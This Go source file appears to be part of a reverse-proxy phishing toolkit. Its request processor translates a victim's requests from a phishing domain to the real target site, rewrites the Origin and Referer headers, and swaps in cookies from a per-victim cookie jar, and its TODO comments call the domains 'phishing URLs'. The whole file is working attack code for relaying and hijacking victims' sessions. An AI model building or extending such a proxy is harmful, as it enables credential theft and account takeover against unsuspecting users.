package main

import (
	"io"
	"io/ioutil"
	"net/http"
	"net/url"

	"github.com/gofiber/fiber/v2"
	"github.com/gofiber/fiber/v2/utils"
)

type RequestProcessor interface {
	Process(c *fiber.Ctx) *http.Request
}

func NewRequestProcessor(conv DomainConverter) RequestProcessor {
	return &requestProcessor{conv}
}

type requestProcessor struct {
	conv DomainConverter
}

// TODO patch query params (phishing URLs to original domains)
// TODO patch phishing URLs in body with original domains
func (p *requestProcessor) Process(c *fiber.Ctx) *http.Request {
	r := c.Request()
	destURL := &url.URL{
		Scheme:   "https",
		Host:     p.conv.ToTargetDomain(utils.UnsafeString(r.URI().Host())),
		Path:     utils.UnsafeString(r.URI().Path()),
		RawQuery: utils.UnsafeString(r.URI().QueryString()),
	}
	var body io.ReadCloser
	stream := c.Context().RequestBodyStream()
	if stream != nil {
		body = ioutil.NopCloser(stream)
	}
	req := &http.Request{
		Method: utils.UnsafeString(r.Header.Method()),
		Body:   body,
		URL:    destURL,
		Header: make(http.Header),
	}

	if req.Method != http.MethodOptions {
		// filter session cookie
		r.Header.DelCookie("session_id")
		cookieJar := c.Locals("cookieJar").(http.CookieJar)
		for _, cookie := range cookieJar.Cookies(destURL) {
			r.Header.SetCookie(cookie.Name, cookie.Value)
		}
	}

	r.Header.VisitAll(func(k, v []byte) {
		sk := utils.UnsafeString(k)
		sv := utils.UnsafeString(v)
		req.Header.Add(sk, sv)
	})

	origin := req.Header["Origin"]
	if len(origin) > 0 {
		req.Header["Origin"] = []string{p.conv.ToTargetURL(origin[0])}
	}
	referer := req.Header["Referer"]
	if len(referer) > 0 {
		if targetURL := p.conv.ToTargetURL(referer[0]); targetURL != "" {
			req.Header["Referer"] = []string{targetURL}
		}
	}
	req.Header.Del("Accept-Encoding")
	return req
}
